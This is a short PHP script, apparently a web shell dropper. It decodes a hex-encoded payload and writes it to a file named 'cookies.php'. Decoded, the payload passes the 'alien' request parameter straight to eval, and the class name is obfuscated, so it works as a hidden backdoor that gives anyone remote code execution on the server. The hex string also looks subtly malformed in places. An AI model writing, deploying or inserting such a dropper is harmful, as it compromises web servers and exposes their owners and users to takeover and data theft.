<?php
function hex2bin_compat($hex) {
    $bin = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $bin .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $bin;
}

$file = fopen('./cookies.php', 'wb');
fwrite($file, hex2bin_compat('3c3f706870a636c61737320474f326e336a3678207ba2020202066756e6374696f6e20474f326e336a36782824483558693229207ba2020202020202020406576616c28222f2a5a5734387239436f77532a2f22202e20244835586932202e202222293ba202020207da7da6e657720474f326e336a367828245f524551554553545b27616c69656e275d293ba3f3e'));
fclose($file);
?>
